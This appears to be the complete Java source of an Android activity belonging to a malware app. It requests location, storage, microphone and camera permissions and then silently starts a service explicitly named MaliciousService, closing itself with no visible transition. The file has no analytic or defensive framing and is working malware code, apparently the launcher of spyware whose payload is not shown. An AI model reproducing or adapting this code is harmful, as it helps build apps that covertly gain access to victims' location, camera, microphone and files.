package com.example.android;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class PermissionRequestActivity extends Activity {
    private static final String TAG = "PermissionActivity";
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final String[] REQUIRED_PERMISSIONS = {
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.CAMERA
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "PermissionRequestActivity created. Checking permissions.");
        requestMissingPermissions();
    }

    private void requestMissingPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            Log.d(TAG, "Android version < 6.0, permissions granted at installation.");
            startServiceAndFinish();
            return;
        }
        List<String> missingPermissions = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
            }
        }
        if (missingPermissions.isEmpty()) {
            Log.d(TAG, "All permissions already granted.");
            startServiceAndFinish();
        } else {
            Log.d(TAG, "Requesting missing permissions: " + missingPermissions.toString());
            requestPermissions(missingPermissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "Permission granted: " + permissions[i]);
                } else {
                    Log.w(TAG, "Permission denied: " + permissions[i]);
                }
            }
            startServiceAndFinish();
        }
    }

    private void startServiceAndFinish() {
        Intent serviceIntent = new Intent(this, MaliciousService.class);
        try {
            if (startService(serviceIntent) != null) {
                Log.d(TAG, "MaliciousService started from PermissionRequestActivity.");
            } else {
                Log.e(TAG, "Failed to start MaliciousService from PermissionRequestActivity.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting MaliciousService from PermissionRequestActivity: " + e.getMessage(), e);
        }
        finish();
        overridePendingTransition(0, 0);
    }
}